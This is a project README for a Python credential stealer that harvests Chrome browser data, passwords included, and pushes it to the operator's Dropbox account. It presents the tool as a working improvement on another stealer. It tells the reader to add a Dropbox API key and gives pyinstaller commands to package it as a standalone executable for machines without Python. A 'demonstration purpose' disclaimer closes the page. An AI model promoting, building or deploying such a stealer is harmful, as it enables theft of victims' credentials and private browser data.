# Chrome_pass_stealer
A python application to steal chrome data and push it back to you
Finds the data , pushes it back to you.


An Improvised Version of [Shaskank Chandak's Password Stealer](https://github.com/shashankchandak/PasswordStealer). What's improved you may ask? That version doesn't work! 

### Before you begin
- Get an DropBox API key from [Here](https://blogs.dropbox.com/developers/2014/05/generate-an-access-token-for-your-own-account/)
- After you get the key add it in `config.json`

#### How to create an exe file ?

- Make the edits in your .py file (add your api key etc)

- Now install pyinstaller
```sh
$ pip install pyinstaller
```
- Build the package by executing following command

```sh
pyinstaller --onefile chromepass.py
```
<b>NOTE:</b> After you build the executable, It will work on any machine even if that machine doesn't have python installed.

<hr>

## Disclaimer 
I am not responsible for any damage caused by you , using this app . This app is made only for demonstration purpose itself.
